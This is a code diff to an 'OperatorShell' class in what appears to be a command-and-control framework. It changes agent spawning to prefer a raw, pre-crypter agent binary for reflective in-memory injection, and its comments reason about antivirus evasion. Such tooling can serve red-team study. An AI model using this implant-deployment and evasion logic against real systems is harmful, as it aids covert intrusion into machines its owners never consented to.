@@ -555,7 +555,13 @@ class OperatorShell:
             arch = agent.arch  # "x64" or "x86"
             project_root = Path(__file__).resolve().parent.parent.parent
             builds_dir = project_root / "builds"
-            agent_binary = builds_dir / f"agent_{arch}.exe"
+            # Use raw (pre-crypter) PE for spawn — crypter adds a fragile
+            # second reflective-load stage for zero benefit (payload never
+            # touches disk, so on-disk AV evasion is pointless).
+            agent_binary = builds_dir / f"agent_{arch}.raw.exe"
+            if not agent_binary.exists():
+                # Fall back to crypted binary if raw not available
+                agent_binary = builds_dir / f"agent_{arch}.exe"
             if not agent_binary.exists():
                 console.print(
                     f"[red]Agent binary not found: {agent_binary}[/red]\n"
@@ -628,8 +634,10 @@ class OperatorShell:
             # Find agent binary for this listener/arch
             project_root = Path(__file__).resolve().parent.parent.parent
             builds_dir = project_root / "builds"
-            # Look for: agent_x64.exe or agent_x86.exe
-            agent_binary = builds_dir / f"agent_{arch}.exe"
+            # Use raw (pre-crypter) PE — reflective injection, never touches disk
+            agent_binary = builds_dir / f"agent_{arch}.raw.exe"
+            if not agent_binary.exists():
+                agent_binary = builds_dir / f"agent_{arch}.exe"
             if not agent_binary.exists():
                 console.print(
                     f"[red]Agent binary not found: {agent_binary}[/red]\n"
